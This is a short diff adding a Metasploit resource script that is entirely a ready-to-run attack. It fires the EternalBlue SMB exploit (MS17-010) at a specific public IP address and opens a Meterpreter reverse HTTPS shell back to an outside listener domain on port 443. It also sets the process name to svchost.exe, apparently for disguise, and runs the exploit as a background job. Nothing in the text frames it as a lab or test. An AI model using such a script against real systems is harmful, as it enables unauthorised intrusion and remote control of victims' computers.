@@ -1,0 +1,12 @@
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 178.221.191.119
+set payload windows/x64/meterpreter/reverse_https
+set LHOST listener.thinkencyber.io.vn
+set LPORT 443
+set ReverseListenerBindAddress 127.0.0.1
+set ReverseListenerBindPort 8080
+set ProcessName svchost.exe
+set VERBOSE true
+set SMBTimeout 60
+set ExitOnSession false
+exploit -j
